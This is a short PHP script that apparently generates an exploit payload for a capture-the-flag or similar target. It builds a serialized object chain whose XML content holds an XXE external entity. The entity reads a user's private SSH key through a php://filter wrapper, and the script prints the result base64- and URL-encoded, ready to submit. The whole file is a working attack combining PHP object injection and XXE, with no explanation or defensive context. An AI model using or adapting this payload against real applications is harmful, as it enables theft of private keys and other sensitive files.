<?php

class Receiving{
	
	public $contents;
	public $function_name = 'toXML';
	private $key;
	private $key_cmp;
	private $feedback;
	
	function __construct($contents,$num,$class = null){
			$this->contents = $contents;
			$this->key = & $this->key_cmp;
			if($num == 2){
				$this->feedback = null;
			}else{
				$this->feedback = $class;
			}
	}
}




function payload(){
	

	
	$xml ='<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/home/ytoworld/.ssh/id_rsa">]>
<root>
<user>&xxe;</user>
<email>a@a.a</email>
<questions>Hello</questions>
<messages>1111</messages>
</root>';
   	$ok = new Receiving($xml,2);
	
   	$take = new Receiving('',1,$ok);

   echo urlencode(base64_encode(json_encode(array(
			'status' => 'success',
			'content' => serialize($take),
			'timestamp' => time()
		))));

   
}
echo payload();